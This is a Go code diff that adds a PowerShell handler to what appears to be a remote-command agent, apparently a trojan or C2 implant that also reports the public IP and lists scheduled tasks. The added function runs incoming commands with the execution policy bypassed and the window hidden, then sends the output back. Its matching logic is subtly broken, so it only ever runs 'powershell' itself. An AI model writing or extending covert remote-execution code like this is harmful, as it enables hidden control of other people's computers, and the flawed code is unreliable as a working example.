@@ -122,6 +122,8 @@ func executeCommandAndSendResult(cmd Command) {
             listScheduledTask(cmd)
     case cmd.Cmd == "publicip":
             publicIp(cmd)
+    case cmd.Cmd == "powershell":
+           execPowerShellAndSendResult(cmd)
     default:
         executeOtherCommand(cmd)
     }
@@ -280,6 +282,30 @@ func publicIp(cmd Command) {
         Result: publicIP,
     })
 }
+
+func execPowerShellAndSendResult(cmd Command) {
+    // If the Cmd already includes "powershell", strip it off to avoid recursion
+    psCmd := strings.TrimSpace(strings.TrimPrefix(strings.ToLower(cmd.Cmd), "powershell"))
+    if psCmd == "" {
+        psCmd = cmd.Cmd
+    }
+
+    command := exec.Command("powershell.exe",
+        "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", psCmd)
+    command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+
+    output, err := command.CombinedOutput()
+    resultText := string(output)
+    if err != nil {
+        resultText += "\nError: " + err.Error()
+    }
+
+    sendResult(CommandResult{
+        ID:     cmd.ID,
+        Result: resultText,
+    })
+}
+
 
 func executeOtherCommand(cmd Command) {
     output, err := exec.Command("cmd", "/C", cmd.Cmd).CombinedOutput()
